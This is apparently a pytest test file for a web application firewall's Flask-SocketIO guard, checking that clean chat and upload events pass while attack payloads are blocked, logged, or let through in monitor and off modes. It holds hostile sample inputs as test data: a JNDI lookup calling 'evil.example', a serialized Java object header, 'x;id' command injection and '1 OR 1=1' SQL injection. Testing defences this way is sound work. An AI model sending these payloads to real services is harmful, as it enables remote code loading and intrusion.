"""Flask-SocketIO events through a real SocketIO server and its test client."""

import json
import logging

import pytest

flask_socketio = pytest.importorskip("flask_socketio")
from flask import Flask  # noqa: E402
from flask_socketio import SocketIO, emit  # noqa: E402

from aiwaf.flask.websocket import aiwaf_message, guard_socketio  # noqa: E402


def server(**guard):
    app = Flask(__name__)
    socketio = SocketIO(app)
    seen = []

    @socketio.on("chat")
    def chat(data):
        seen.append(data)
        emit("reply", {"got": data})

    @socketio.on("upload", namespace="/files")
    def upload(blob):
        seen.append(blob)

    if guard is not None:
        guard_socketio(socketio, **guard)
    return app, socketio, seen


def test_ordinary_events_reach_handlers_and_an_attack_disconnects(caplog):
    app, socketio, seen = server()
    client = socketio.test_client(app)
    client.emit("chat", {"text": "O'Reilly's guide"})
    assert client.get_received()[-1]["args"][0] == {"got": {"text": "O'Reilly's guide"}}
    with caplog.at_level(logging.WARNING, logger="aiwaf.websocket"):
        client.emit("chat", {"text": "${jndi:ldap://evil.example/a}"})
    assert seen == [{"text": "O'Reilly's guide"}]
    assert not client.is_connected()
    assert json.loads(caplog.records[0].getMessage()) == {"event": "aiwaf.websocket", "mode": "block", "path": "/",
                                                          "rule": "rce_jndi_lookup"}
    assert "evil.example" not in caplog.text


def test_binary_and_namespaced_events_are_checked():
    app, socketio, seen = server()
    client = socketio.test_client(app, namespace="/files")
    client.emit("upload", b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap", namespace="/files")
    assert seen == []
    assert not client.is_connected(namespace="/files")


def test_monitor_runs_the_handler_and_off_checks_nothing(caplog):
    app, socketio, seen = server(mode="monitor")
    client = socketio.test_client(app)
    with caplog.at_level(logging.WARNING, logger="aiwaf.websocket"):
        client.emit("chat", "x;id")
    assert seen == ["x;id"] and client.is_connected()
    assert json.loads(caplog.records[0].getMessage())["mode"] == "monitor"
    app, socketio, seen = server(mode="off")
    socketio.test_client(app).emit("chat", "x;id")
    assert seen == ["x;id"]


def test_the_decorator_checks_one_handler():
    app = Flask(__name__)
    socketio = SocketIO(app)
    seen = []

    @socketio.on("chat")
    @aiwaf_message()
    def chat(data):
        seen.append(data)

    @socketio.on("free")
    @aiwaf_message(mode="off")
    def free(data):
        seen.append(data)

    client = socketio.test_client(app)
    client.emit("chat", "hello")
    client.emit("free", "x;id")
    client.emit("chat", "1 OR 1=1")
    assert seen == ["hello", "x;id"]
    assert not client.is_connected()


def test_an_event_that_cant_be_read_is_refused_and_an_unknown_version_fails_loudly():
    app, socketio, seen = server()
    cyclic = {}
    cyclic["self"] = cyclic
    from aiwaf.flask.websocket import _event_finding
    from aiwaf.core.sql_injection import SQLInjectionPolicy

    assert _event_finding("chat", [cyclic], SQLInjectionPolicy()).status == 413

    class Unknown:
        pass

    with pytest.raises(RuntimeError):
        guard_socketio(Unknown())
